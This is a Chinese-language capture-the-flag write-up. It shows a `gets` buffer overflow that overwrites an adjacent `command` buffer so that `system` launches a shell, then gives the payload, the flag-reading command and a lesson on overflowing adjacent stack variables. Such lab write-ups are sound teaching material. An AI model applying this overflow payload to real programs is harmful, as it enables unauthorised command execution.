# cowsaymoo

## 题目简述

程序用 `gets` 读入 80 字节的 `name`，随后构造 `cowsay` 命令并交给 `system`。同一栈帧中另有 80 字节 `command` 数组。目标是通过相邻变量覆盖，把待执行命令改成 shell。

## 解题过程

核心代码为：

```c
char command[80];
char name[80];
strcpy(command, "cowsay ");
gets(name);
snprintf(command + 7, 80 - 7, "'hello %s!'", name);
system(command);
```

官方构建的栈布局中，`name` 紧邻并位于 `command` 之前。`gets` 没有长度限制，填满 `name` 的 80 字节后，后续内容会覆盖 `command`。发送：

```python
payload = b"A" * 80 + b"sh"
```

溢出先把 `command` 改为以 `sh\0` 开头。虽然随后的 `snprintf` 从 `command+7` 写入，但不会破坏开头的 `sh`，因此最终 `system(command)` 执行 shell。进入 shell 后读取 flag 文件：

```bash
cat flag.txt
```

得到：

```text
grey{buffer_overflowed_into_the_cow_owo}
```

## 方法总结

缓冲区溢出不一定要覆盖返回地址；覆盖同一栈帧中的命令、布尔值或函数指针同样能改变控制效果。本题还应以实际编译后二进制确认变量相对位置，而不能只凭 C 源码声明顺序泛化。
